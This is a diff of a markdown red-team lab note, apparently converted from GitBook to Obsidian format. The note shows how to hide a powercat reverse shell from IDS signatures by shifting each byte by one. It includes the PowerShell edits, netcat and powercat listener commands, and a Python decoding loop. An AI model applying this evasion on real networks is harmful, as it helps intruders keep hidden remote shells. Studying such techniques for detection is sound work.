@@ -13,10 +13,9 @@ Microsoft Windows [Version 10.0.17763.475]
 
 This can usually be bypassed relatively easily with some simple traffic obfuscation and this quick lab demonstrates just that.
 
-{% hint style="danger" %}
-**Warning**\
-This technique is not meant to be used in real life red team operations!
-{% endhint %}
+> [!DANGER]
+> **Warning**\
+> This technique is not meant to be used in real life red team operations!
 
 ## Environment and Setup
 
@@ -37,7 +36,7 @@ In powercat.ps1, let's find the function `ReadData_CMD` and add a new line (576 
 $Data = $Data | % {[byte]$_+1}
 ```
 
-![](<../../.gitbook/assets/Annotation 2019-05-18 121935 (1).png>)
+![[Annotation 2019-05-18 121935 (1).png]]
 
 With the modified powercat, let's try establishing a reverse shell and catch it on the other end and see what happens:
 
@@ -51,7 +50,7 @@ powercat -l -p 443 -v
 
 Below shows the incoming reverse shell, but it's of course not readable since we shifted all the characters by one. Although this is enough to bypass IDS signatures relying on the cmd prompt banner crossing the network, the shell on itself is not very useful since we cannot read the results:
 
-![](<../../.gitbook/assets/Annotation 2019-05-18 123445.png>)
+![[Annotation 2019-05-18 123445.png]]
 
 ## Decoding Responses
 
@@ -63,22 +62,22 @@ $Data = $Data | % {[byte]$_-1}
 
 In powercat.ps1, find the function `WriteData_Console` and add the code just below the parameter declaration:
 
-![](<../../.gitbook/assets/Annotation 2019-05-18 124925.png>)
+![[Annotation 2019-05-18 124925.png]]
 
 If we try establishing the reverse shell now, we can see it gets decoded nicely on the attacking system running powercat listener on Windows:
 
-![](<../../.gitbook/assets/Annotation 2019-05-18 124837.png>)
+![[Annotation 2019-05-18 124837.png]]
 
 If we inspect the traffic, we confirm that the traffic is encoded:
 
-![](<../../.gitbook/assets/Annotation 2019-05-18 130428.png>)
+![[Annotation 2019-05-18 130428.png]]
 
 ## Decoding Responses in Linux
 
 If we are listening for a shell in netcat on a Linux box with no powershell (my kali was giving me a hard time trying to install powershell), we need to hack together a filthy python loop that will do the decoding for us first:
 
-{% code title="decode.py@kali" %}
 ```python
+// decode.py@kali
 #!/usr/bin/python3
 import os, time
 
@@ -106,25 +105,22 @@ while 1:
     os.system("echo > myfile")
     time.sleep(1)
 ```
-{% endcode %}
 
 Let's launch the netcat listener on a linux box and pipe the output to `tee` so it can be put to a file `myfile`
 
-{% code title="attacker@kali" %}
 ```
+// attacker@kali
 nc -lvvp 443 | tee myfile
 ```
-{% endcode %}
 
 In another terminal, we need to launch the `decoder.py` which will read the `myfile` every second and will decode its content and wipe it:
 
-{% code title="attacker@kali" %}
 ```
+// attacker@kali
 ./decoder.py
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Annotation 2019-05-18 132903.png>)
+![[Annotation 2019-05-18 132903.png]]
 
 We can now send the reverse shell back from the windows machine and see how it works:
 
@@ -132,4 +128,4 @@ We can now send the reverse shell back from the windows machine and see how it w
 * Top left - the reverse shell comes in, responses are encoded. This is where we can issue commands
 * Bottom left - reverse shell responses are decoded
 
-![](../../.gitbook/assets/revshell.gif)
+![[revshell.gif]]
